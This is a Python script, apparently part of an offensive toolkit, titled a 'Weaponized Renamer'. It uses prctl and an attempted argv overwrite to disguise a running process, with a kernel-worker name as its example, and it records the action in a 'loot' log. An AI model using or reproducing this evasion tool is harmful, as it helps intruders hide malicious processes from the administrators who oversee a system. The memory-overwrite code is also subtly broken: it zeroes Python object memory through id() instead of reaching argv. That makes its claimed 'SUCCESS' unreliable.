import ctypes
import os
import sys

# Load libc to access prctl and memset
libc = ctypes.CDLL("libc.so.6")

def set_proc_name(new_name):
    """
    Weaponized Renamer: Uses prctl to change the internal thread 
    name (comm) and overwrites argv[0] for ps/top visibility.
    """
    print(f"[*] Original Process Name: {sys.argv[0]}")
    
    # 1. Change the Comm Name (Used by top and /proc/self/comm)
    # PR_SET_NAME = 15
    libc.prctl(15, new_name.encode('utf-8'), 0, 0, 0)

    # 2. Overwrite the argv[0] pointer in memory
    # This is what 'ps' and 'htop' usually read.
    # We find the address of the first argument and zero it out, then write.
    try:
        argc = ctypes.c_int()
        argv = ctypes.POINTER(ctypes.c_char_p)()
        
        # This is a low-level hack to reach the process's argument vector
        # Note: Effectiveness varies by Python version and OS hardening
        for i in range(len(sys.argv)):
            arg_len = len(sys.argv[i])
            # Create a buffer and copy the new name into it
            buffer = ctypes.create_string_buffer(new_name.encode('utf-8'))
            # Calculate where the original arg was and overwrite it
            # We effectively 'blank' the original argv space
            libc.memset(id(sys.argv[i]), 0, arg_len)
            
        print(f"[!!!] SUCCESS: Process title spoofed to: {new_name}")
        
        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: PROC_RENAME | New_Name: {new_name} | PID: {os.getpid()}\n")

    except Exception as e:
        print(f"[-] Renamer Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 158_renamer <new_process_name>")
        print("Example: 158_renamer '[kworker/0:1-events]'")
        sys.exit(1)
    
    # Keep the process alive so you can verify with 'ps aux'
    set_proc_name(sys.argv[1])
    print("[*] Process spoofed. Check 'ps aux | grep " + sys.argv[1] + "'")
    import time
    while True:
        time.sleep(60)
